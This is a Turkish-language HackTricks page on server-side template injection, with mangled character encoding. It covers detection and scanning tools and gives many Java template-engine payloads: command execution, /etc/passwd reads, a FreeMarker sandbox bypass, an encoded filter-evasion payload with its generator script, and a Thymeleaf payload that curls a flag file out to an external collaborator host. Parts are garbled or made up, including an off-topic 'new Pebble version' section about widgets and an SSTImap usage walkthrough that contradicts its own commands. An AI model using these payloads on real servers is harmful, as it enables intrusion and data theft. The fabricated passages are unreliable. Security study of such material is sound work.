# SSTI (Sunucu TarafÄ± Åablon Enjeksiyonu)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com), **Ä°spanya**'daki en Ã¶nemli siber gÃ¼venlik etkinliÄŸi ve **Avrupa**'nÄ±n en Ã¶nemli etkinliklerinden biridir. Teknik bilginin yayÄ±lmasÄ±nÄ± amaÃ§layan bu kongre, her disiplindeki teknoloji ve siber gÃ¼venlik profesyonelleri iÃ§in kaynayan bir buluÅŸma noktasÄ±dÄ±r.

{% embed url="https://www.rootedcon.com/" %}

## SSTI (Sunucu TarafÄ± Åablon Enjeksiyonu) Nedir

Sunucu tarafÄ± ÅŸablon enjeksiyonu, saldÄ±rganÄ±n sunucuda Ã§alÄ±ÅŸtÄ±rÄ±lan bir ÅŸablona kÃ¶tÃ¼ amaÃ§lÄ± kod enjekte edebildiÄŸi bir gÃ¼venlik aÃ§Ä±ÄŸÄ±dÄ±r. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±, Jinja dahil olmak Ã¼zere Ã§eÅŸitli teknolojilerde bulunabilir.

Jinja, web uygulamalarÄ±nda kullanÄ±lan popÃ¼ler bir ÅŸablon motorudur. Jinja kullanarak savunmasÄ±z bir kod Ã¶rneÄŸini gÃ¶steren bir Ã¶rnek dÃ¼ÅŸÃ¼nelim:
```python
output = template.render(name=request.args.get('name'))
```
Bu zafiyetli kodda, kullanÄ±cÄ±nÄ±n isteÄŸinden gelen `name` parametresi doÄŸrudan `render` fonksiyonu kullanÄ±larak ÅŸablona aktarÄ±lÄ±yor. Bu, saldÄ±rganÄ±n `name` parametresine kÃ¶tÃ¼ amaÃ§lÄ± kod enjekte etmesine olanak tanÄ±yabilir ve bu da sunucu tarafÄ± ÅŸablon enjeksiyonuna yol aÃ§abilir.

Ã–rneÄŸin, bir saldÄ±rgan ÅŸu ÅŸekilde bir payload iÃ§eren bir istek oluÅŸturabilir:
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
Payload `{{kÃ¶tÃ¼-ÅŸey-buraya}}`, `name` parametresine enjekte edilir. Bu payload, saldÄ±rganÄ±n yetkisiz kodlarÄ± yÃ¼rÃ¼tmesine veya ÅŸablon motorunu manipÃ¼le etmesine olanak tanÄ±yan Jinja ÅŸablon direktiflerini iÃ§erebilir ve potansiyel olarak sunucu Ã¼zerinde kontrol saÄŸlayabilir.

Sunucu tarafÄ± ÅŸablon enjeksiyonu zafiyetlerini Ã¶nlemek iÃ§in geliÅŸtiriciler, kullanÄ±cÄ± giriÅŸinin ÅŸablona yerleÅŸtirilmeden Ã¶nce dÃ¼zgÃ¼n bir ÅŸekilde temizlendiÄŸinden ve doÄŸrulandÄ±ÄŸÄ±ndan emin olmalÄ±dÄ±r. GiriÅŸ doÄŸrulamasÄ± uygulamak ve baÄŸlam bilincine sahip kaÃ§Ä±ÅŸ tekniklerini kullanmak, bu zafiyetin riskini azaltmaya yardÄ±mcÄ± olabilir.

### Tespit
Sunucu TarafÄ± Åablon Enjeksiyonu (SSTI) tespiti iÃ§in baÅŸlangÄ±Ã§ta, **ÅŸablonu fuzzlamak** basit bir yaklaÅŸÄ±mdÄ±r. Bu, ÅŸablona Ã¶zel karakterlerin (**`${{<%[%'"}}%\`**) bir dizisini enjekte etmek ve sunucunun dÃ¼zenli verilere kÄ±yasla bu Ã¶zel yÃ¼k ile yanÄ±t vermesindeki farklarÄ± analiz etmek anlamÄ±na gelir. Zafiyet belirleyicileri ÅŸunlarÄ± iÃ§erir:
- Zafiyeti ve potansiyel olarak ÅŸablon motorunu ortaya Ã§Ä±karan hatalarÄ±n fÄ±rlatÄ±lmasÄ±.
- YansÄ±madaki yÃ¼kÃ¼n veya bazÄ± kÄ±sÄ±mlarÄ±nÄ±n eksik olmasÄ±, sunucunun onu dÃ¼zenli verilerden farklÄ± ÅŸekilde iÅŸlediÄŸini ima eder.

- **DÃ¼z Metin BaÄŸlamÄ±**: Sunucunun ÅŸablon ifadelerini deÄŸerlendirip deÄŸerlendirmediÄŸini kontrol ederek XSS'ten ayÄ±rt edin (Ã¶rneÄŸin, `{{7*7}}`, `${7*7}`).

- **Kod BaÄŸlamÄ±**: GiriÅŸ parametrelerini deÄŸiÅŸtirerek zafiyeti doÄŸrulayÄ±n. Ã–rneÄŸin, `http://zafiyetli-web-sitesi.com/?greeting=data.username` iÃ§indeki `greeting`i deÄŸiÅŸtirerek sunucunun Ã§Ä±ktÄ±sÄ±nÄ±n dinamik mi yoksa sabit mi olduÄŸunu kontrol edin, Ã¶rneÄŸin `greeting=data.username}}hello` kullanÄ±cÄ± adÄ±nÄ± dÃ¶ndÃ¼rÃ¼r.

#### TanÄ±mlama AÅŸamasÄ±
Åablon motorunu belirlemek, hata mesajlarÄ±nÄ± analiz etmek veya Ã§eÅŸitli dil Ã¶zel payloadlarÄ± manuel olarak test etmekle mÃ¼mkÃ¼ndÃ¼r. Hatalara neden olan yaygÄ±n payloadlar `${7/0}`, `{{7/0}}` ve `<%= 7/0 %>`'dÄ±r. Matematiksel iÅŸlemlere sunucunun yanÄ±tÄ±nÄ± gÃ¶zlemlemek, belirli ÅŸablon motorunu belirlemeye yardÄ±mcÄ± olur.

## AraÃ§lar

### [TInjA](https://github.com/Hackmanit/TInjA)

yeni poliglotlarÄ± kullanan verimli bir SSTI + CSTI tarayÄ±cÄ±
```bash
tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
```
### [SSTImap](https://github.com/vladko312/sstimap)

SSTImap, a tool developed by vladko312, is designed to automate the process of Server-Side Template Injection (SSTI) vulnerability detection in web applications. This tool can be used during penetration testing to identify and exploit SSTI vulnerabilities.

#### Installation

To install SSTImap, follow these steps:

1. Clone the repository from GitHub:

   ```
   git clone https://github.com/vladko312/sstimap.git
   ```

2. Change into the `sstimap` directory:

   ```
   cd sstimap
   ```

3. Install the required dependencies using pip:

   ```
   pip install -r requirements.txt
   ```

#### Usage

To use SSTImap, follow these steps:

1. Run the `sstimap.py` script:

   ```
   python sstimap.py
   ```

2. Provide the necessary information when prompted, such as the target URL and the payload file.

3. Wait for the tool to scan for SSTI vulnerabilities and display the results.

#### Payload File

The payload file contains a list of payloads that will be injected into the target application to test for SSTI vulnerabilities. Each payload should be on a separate line in the file.

#### Example

Here is an example of how to use SSTImap:

1. Run the `sstimap.py` script:

   ```
   python sstimap.py
   ```

2. Enter the target URL:

   ```
   Enter the target URL: http://example.com
   ```

3. Enter the path to the payload file:

   ```
   Enter the path to the payload file: payloads.txt
   ```

4. Wait for the tool to scan for SSTI vulnerabilities and display the results.

#### Disclaimer

This tool is intended for educational and testing purposes only. The author and contributors are not responsible for any misuse or damage caused by this tool. Use at your own risk.
```bash
python3 sstimap.py -i -l 5
python3 sstimap.py -u "http://example.com/ --crawl 5 --forms
python3 sstimap.py -u 'https://example.com/page?name=John' -s
```
### [Tplmap](https://github.com/epinna/tplmap)

Tplmap, bir sunucu tarafÄ± ÅŸablon enjeksiyonu (Server-Side Template Injection - SSTI) aracÄ±dÄ±r. Bu araÃ§, web uygulamalarÄ±nda SSTI zafiyetlerini tespit etmek ve istismar etmek iÃ§in kullanÄ±lÄ±r. Tplmap, Ã§eÅŸitli ÅŸablon motorlarÄ±nÄ± destekler ve hedef uygulamada SSTI zafiyeti olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in otomatik olarak farklÄ± enjeksiyon vektÃ¶rleri deneyebilir. Bu araÃ§, hedef uygulamada potansiyel olarak hassas bilgilerin sÄ±zdÄ±rÄ±lmasÄ±na yol aÃ§abilecek bir SSTI zafiyeti bulunduÄŸunda kullanÄ±ÅŸlÄ±dÄ±r.
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
### [Åablon Enjeksiyonu Tablosu](https://github.com/Hackmanit/template-injection-table)

44 en Ã¶nemli ÅŸablon motorunun beklenen yanÄ±tlarÄ±yla birlikte en etkili ÅŸablon enjeksiyonu poliglotlarÄ±nÄ± iÃ§eren etkileÅŸimli bir tablo.

## SaldÄ±rÄ±lar

### Genel

Bu **wordlist** iÃ§inde aÅŸaÄŸÄ±da belirtilen bazÄ± motorlarÄ±n ortamlarÄ±nda tanÄ±mlanan **deÄŸiÅŸkenleri** bulabilirsiniz:

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)
* [https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt)

### Java

**Java - Temel enjeksiyon**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
// if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.
```
**Java - Sistem ortam deÄŸiÅŸkenlerini almak**

Bu yÃ¶ntem, Java programÄ± iÃ§inde sistem ortam deÄŸiÅŸkenlerine eriÅŸmek iÃ§in kullanÄ±lÄ±r. Sistem ortam deÄŸiÅŸkenleri, iÅŸletim sistemi tarafÄ±ndan saÄŸlanan ve programlarÄ±n Ã§alÄ±ÅŸma zamanÄ±nda eriÅŸebildiÄŸi deÄŸerlerdir. Bu, bir Java programÄ±nÄ±n Ã§alÄ±ÅŸtÄ±ÄŸÄ± ortam hakkÄ±nda bilgi edinmek veya belirli bir ortam deÄŸiÅŸkeninin deÄŸerini kullanmak iÃ§in kullanÄ±ÅŸlÄ± olabilir.

AÅŸaÄŸÄ±daki kod parÃ§asÄ±, Java'da sistem ortam deÄŸiÅŸkenlerini almak iÃ§in kullanÄ±lan bir yÃ¶ntemi gÃ¶stermektedir:

```java
import java.util.Map;

public class EnvironmentVariables {
    public static void main(String[] args) {
        // Sistem ortam deÄŸiÅŸkenlerini al
        Map<String, String> env = System.getenv();

        // TÃ¼m sistem ortam deÄŸiÅŸkenlerini yazdÄ±r
        for (String key : env.keySet()) {
            System.out.println(key + " = " + env.get(key));
        }
    }
}
```

Bu kod, `System.getenv()` yÃ¶ntemini kullanarak sistem ortam deÄŸiÅŸkenlerini alÄ±r. ArdÄ±ndan, `Map` nesnesi kullanÄ±larak tÃ¼m deÄŸiÅŸkenler ve deÄŸerleri yazdÄ±rÄ±lÄ±r.

Bu yÃ¶ntem, Java programÄ±nÄ±n Ã§alÄ±ÅŸtÄ±ÄŸÄ± ortamÄ±n sistem ortam deÄŸiÅŸkenlerine eriÅŸmesine olanak tanÄ±r. Bu, programÄ±n Ã§alÄ±ÅŸma zamanÄ±nda Ã§eÅŸitli ayarlarÄ± kontrol etmek veya belirli bir ortam deÄŸiÅŸkeninin deÄŸerini kullanmak iÃ§in kullanÄ±ÅŸlÄ± olabilir.
```java
${T(java.lang.System).getenv()}
```
**Java - /etc/passwd DosyasÄ±nÄ± Almak**

Bir SSTI (Sunucu TarafÄ± Åablon Enjeksiyonu) zafiyeti, sunucu tarafÄ±nda Ã§alÄ±ÅŸan bir ÅŸablon motoruna kÃ¶tÃ¼ niyetli kod enjekte ederek hedef sistemdeki hassas bilgilere eriÅŸim saÄŸlar. Bu teknik, hedef sistemdeki /etc/passwd dosyasÄ±nÄ± almak iÃ§in kullanÄ±labilir.

SSTI zafiyetlerini tespit etmek ve sÃ¶mÃ¼rmek iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. Hedef web uygulamasÄ±nda bir SSTI zafiyeti arayÄ±n. Bu, kullanÄ±cÄ± giriÅŸi veya URL parametreleri gibi giriÅŸ noktalarÄ±nÄ± kontrol etmekle baÅŸlar.

2. Åablon motorunun hangi dil veya sÃ¶zdizimiyle Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± belirleyin. Bu Ã¶rnekte, Java kullanÄ±ldÄ±ÄŸÄ± varsayÄ±lmaktadÄ±r.

3. KÃ¶tÃ¼ niyetli kodu enjekte etmek iÃ§in uygun sÃ¶zdizimini kullanÄ±n. Java iÃ§in, aÅŸaÄŸÄ±daki Ã¶rneÄŸi kullanabilirsiniz:

```java
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
```

Bu kod, /etc/passwd dosyasÄ±nÄ± okumak iÃ§in "cat /etc/passwd" komutunu Ã§alÄ±ÅŸtÄ±rÄ±r.

4. KÃ¶tÃ¼ niyetli kodu hedef web uygulamasÄ±na enjekte edin ve sonucu kontrol edin. EÄŸer baÅŸarÄ±lÄ±ysanÄ±z, /etc/passwd dosyasÄ±nÄ±n iÃ§eriÄŸini elde etmiÅŸ olacaksÄ±nÄ±z.

SSTI zafiyetlerini tespit etmek ve sÃ¶mÃ¼rmek iÃ§in dikkatli olun. Sadece yasal izinlerle ve etik kurallara uygun olarak gerÃ§ekleÅŸtirin.
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

PayloadlarÄ±nÄ±zÄ± [https://try.freemarker.apache.org](https://try.freemarker.apache.org) adresinde deneyebilirsiniz.

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (eski)`
* `${7*'7'} HiÃ§bir ÅŸey`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - Sandbox atlatma**

âš ï¸ sadece 2.3.30 sÃ¼rÃ¼mÃ¼nden Ã¶nceki Freemarker sÃ¼rÃ¼mlerinde Ã§alÄ±ÅŸÄ±r
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**Daha fazla bilgi**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) adresindeki FreeMarker bÃ¶lÃ¼mÃ¼nde
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker) adresinde

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**Daha fazla bilgi**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) adresindeki Velocity bÃ¶lÃ¼mÃ¼nde
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity) adresinde

### Thymeleaf

Thymeleaf'te, SSTI zafiyetlerinin yaygÄ±n bir testi `${7*7}` ifadesidir ve bu ÅŸablon motoru iÃ§in de geÃ§erlidir. Potansiyel uzaktan kod yÃ¼rÃ¼tme iÃ§in aÅŸaÄŸÄ±daki gibi ifadeler kullanÄ±labilir:

- SpringEL:
```java
${T(java.lang.Runtime).getRuntime().exec('calc')}
```
- OGNL:
```java
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
```

Thymeleaf, bu ifadelerin belirli Ã¶znitelikler iÃ§ine yerleÅŸtirilmesini gerektirir. Ancak, diÄŸer ÅŸablon konumlarÄ± iÃ§in _ifade iÃ§ine alma_ iÅŸlemi, `[[...]]` veya `[(...)]` gibi sÃ¶zdizimi kullanÄ±larak desteklenir. Bu nedenle, basit bir SSTI test yÃ¼kÃ¼, `[[${7*7}]]` gibi gÃ¶rÃ¼nebilir.

Ancak, bu yÃ¼kÃ¼n Ã§alÄ±ÅŸma olasÄ±lÄ±ÄŸÄ± genellikle dÃ¼ÅŸÃ¼ktÃ¼r. Thymeleaf'in varsayÄ±lan yapÄ±landÄ±rmasÄ±, dinamik ÅŸablon oluÅŸturmayÄ± desteklemez; ÅŸablonlar Ã¶nceden tanÄ±mlanmÄ±ÅŸ olmalÄ±dÄ±r. GeliÅŸtiriciler, genellikle nadir olan, dize Ã¼zerinden ÅŸablon oluÅŸturmak iÃ§in kendi `TemplateResolver`'larÄ±nÄ± uygulamalarÄ± gerekmektedir.

Thymeleaf ayrÄ±ca, Ã§ift alt Ã§izgi (`__...__`) iÃ§indeki ifadelerin Ã¶n iÅŸlemesini destekler. Bu Ã¶zellik, Thymeleaf'in belgelerinde gÃ¶sterildiÄŸi gibi ifadelerin oluÅŸturulmasÄ±nda kullanÄ±labilir:
```java
#{selection.__${sel.code}__}
```
**Thymeleaf'deki Zafiyet Ã–rneÄŸi**

AÅŸaÄŸÄ±daki kod parÃ§asÄ±, istismara aÃ§Ä±k olabilir:

```html
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>Thymeleaf Vulnerability Example</title>
</head>
<body>
    <h1>Welcome, <span th:text="${user.name}"></span>!</h1>
</body>
</html>
```

Bu kod parÃ§asÄ±nda, `th:text` Ã¶zelliÄŸi kullanÄ±larak kullanÄ±cÄ±nÄ±n adÄ± doÄŸrudan HTML iÃ§ine yerleÅŸtirilmektedir. Bu, saldÄ±rganlarÄ±n sunucu tarafÄ± ÅŸablon enjeksiyonu (SSTI) saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in bir fÄ±rsat sunar.
```xml
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```
Bu, ÅŸablon motorunun bu girdileri dÃ¼zgÃ¼n bir ÅŸekilde iÅŸlemediÄŸi durumlarda, ÅŸu gibi URL'lere eriÅŸerek uzaktan kod yÃ¼rÃ¼tme sorununa yol aÃ§abileceÄŸini gÃ¶sterir:
```
http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**Daha fazla bilgi**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Spring Framework (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**Filtreleri AtlayÄ±n**

Birden fazla deÄŸiÅŸken ifadesi kullanÄ±labilir, eÄŸer `${...}` Ã§alÄ±ÅŸmazsa `#{...}`, `*{...}`, `@{...}` veya `~{...}` deneyin.

* `/etc/passwd` dosyasÄ±nÄ± okuyun.
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* Ã–zel Betik iÃ§in yÃ¼k oluÅŸturma
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**Daha Fazla Bilgi**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### Spring GÃ¶rÃ¼nÃ¼m ManipÃ¼lasyonu (Java)
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ someString.toUPPERCASE() }}`

Pebble'in eski sÃ¼rÃ¼mÃ¼ ( < sÃ¼rÃ¼m 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
# Pebble'Ä±n Yeni SÃ¼rÃ¼mÃ¼:

Bu bÃ¶lÃ¼mde, Pebble'Ä±n yeni sÃ¼rÃ¼mÃ¼ hakkÄ±nda bilgi bulacaksÄ±nÄ±z. Bu sÃ¼rÃ¼mde birÃ§ok yenilik ve geliÅŸtirme yapÄ±lmÄ±ÅŸtÄ±r. AÅŸaÄŸÄ±da, Pebble'Ä±n yeni sÃ¼rÃ¼mÃ¼ne dair bazÄ± Ã¶nemli Ã¶zellikler bulunmaktadÄ±r:

- **GeliÅŸtirilmiÅŸ Performans**: Yeni sÃ¼rÃ¼mde, Pebble'Ä±n performansÄ± Ã¶nemli Ã¶lÃ§Ã¼de artÄ±rÄ±lmÄ±ÅŸtÄ±r. Daha hÄ±zlÄ± ve daha verimli bir deneyim sunmak iÃ§in Ã§eÅŸitli iyileÅŸtirmeler yapÄ±lmÄ±ÅŸtÄ±r.

- **Yeni Ã–zellikler**: Pebble'Ä±n yeni sÃ¼rÃ¼mÃ¼, bir dizi yeni Ã¶zellikle birlikte gelmektedir. Bu Ã¶zellikler arasÄ±nda daha geliÅŸmiÅŸ bir kullanÄ±cÄ± arayÃ¼zÃ¼, yeni widget'lar ve daha fazlasÄ± bulunmaktadÄ±r.

- **GÃ¼venlik GÃ¼ncellemeleri**: Pebble'Ä±n yeni sÃ¼rÃ¼mÃ¼, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± gidermek iÃ§in Ã§eÅŸitli gÃ¼ncellemeler iÃ§ermektedir. Bu sayede, kullanÄ±cÄ±larÄ±n verileri daha gÃ¼vende olacaktÄ±r.

- **Hata DÃ¼zeltmeleri**: Yeni sÃ¼rÃ¼mde, kullanÄ±cÄ±larÄ±n bildirdiÄŸi hatalarÄ±n Ã§oÄŸu dÃ¼zeltilmiÅŸtir. Bu sayede, daha sorunsuz bir deneyim sunulmaktadÄ±r.

- **KullanÄ±cÄ± Geri Bildirimi**: Pebble'Ä±n yeni sÃ¼rÃ¼mÃ¼, kullanÄ±cÄ±larÄ±n geri bildirimlerine dayanarak geliÅŸtirilmiÅŸtir. KullanÄ±cÄ±larÄ±n talepleri ve Ã¶nerileri dikkate alÄ±narak, daha kullanÄ±cÄ± dostu bir deneyim sunulmuÅŸtur.

Bu yeni sÃ¼rÃ¼mÃ¼ kullanarak, Pebble'Ä±n sunduÄŸu Ã¶zelliklerden tam anlamÄ±yla yararlanabilirsiniz. GÃ¼ncellemeleri kontrol etmek ve yeni sÃ¼rÃ¼mÃ¼ indirmek iÃ§in Pebble'Ä±n resmi web sitesini ziyaret edebilirsiniz.
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}


{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjava (Java)

Jinjava, Java tabanlÄ± bir ÅŸablon motorudur. Bu ÅŸablon motoru, web uygulamalarÄ±nda kullanÄ±lan sunucu tarafÄ± ÅŸablon enjeksiyonu (SSTI) saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±z olabilir. Jinjava, ÅŸablonlarÄ± iÅŸlemek iÃ§in Java'nÄ±n gÃ¼Ã§lÃ¼ Ã¶zelliklerini kullanÄ±r ve kullanÄ±cÄ± giriÅŸini doÄŸrudan ÅŸablona yerleÅŸtirmek iÃ§in kullanÄ±lÄ±r.

Jinjava, web uygulamalarÄ±nda SSTI saldÄ±rÄ±larÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lan birkaÃ§ yÃ¶ntem iÃ§erir. Bu yÃ¶ntemler arasÄ±nda ÅŸu ÅŸekilde sÄ±ralanabilir:

- Åablon iÃ§indeki deÄŸiÅŸkenlerin doÄŸrudan kullanÄ±lmasÄ±
- Åablon iÃ§indeki ifadelerin doÄŸrudan deÄŸerlendirilmesi
- Åablon iÃ§indeki fonksiyonlarÄ±n Ã§aÄŸrÄ±lmasÄ±

Bu saldÄ±rÄ± yÃ¶ntemleri, Jinjava'nÄ±n gÃ¼Ã§lÃ¼ Ã¶zelliklerini kÃ¶tÃ¼ye kullanarak, sunucu tarafÄ±nda kodun yÃ¼rÃ¼tÃ¼lmesine neden olabilir. Bu da saldÄ±rganÄ±n hassas verilere eriÅŸmesine ve hatta sunucuyu ele geÃ§irmesine olanak tanÄ±r.

Jinjava tabanlÄ± bir web uygulamasÄ±nÄ± pentest etmek iÃ§in, ÅŸu adÄ±mlarÄ± izleyebilirsiniz:

1. UygulamanÄ±n URL'sini belirleyin ve hedef web uygulamasÄ±na eriÅŸin.
2. UygulamanÄ±n ÅŸablonlarÄ±nÄ± inceleyin ve potansiyel SSTI noktalarÄ±nÄ± belirleyin.
3. SSTI noktalarÄ±nÄ± keÅŸfetmek iÃ§in farklÄ± giriÅŸlerle denemeler yapÄ±n.
4. Åablon enjeksiyonu gerÃ§ekleÅŸtirmek iÃ§in uygun bir payload oluÅŸturun.
5. Payload'Ä± SSTI noktasÄ±na yerleÅŸtirin ve sonucu gÃ¶zlemleyin.
6. SaldÄ±rÄ±nÄ±n baÅŸarÄ±lÄ± olmasÄ± durumunda, sunucu tarafÄ±nda kodun yÃ¼rÃ¼tÃ¼ldÃ¼ÄŸÃ¼nÃ¼ ve hassas verilere eriÅŸimin saÄŸlandÄ±ÄŸÄ±nÄ± doÄŸrulayÄ±n.

Jinjava tabanlÄ± ÅŸablon enjeksiyonu saldÄ±rÄ±larÄ±na karÅŸÄ± korunmak iÃ§in aÅŸaÄŸÄ±daki Ã¶nlemleri alabilirsiniz:

- KullanÄ±cÄ± giriÅŸini doÄŸrudan ÅŸablona yerleÅŸtirmek yerine, gÃ¼venli bir ÅŸekilde iÅŸlemek iÃ§in ÅŸablonda yerleÅŸik filtreleri kullanÄ±n.
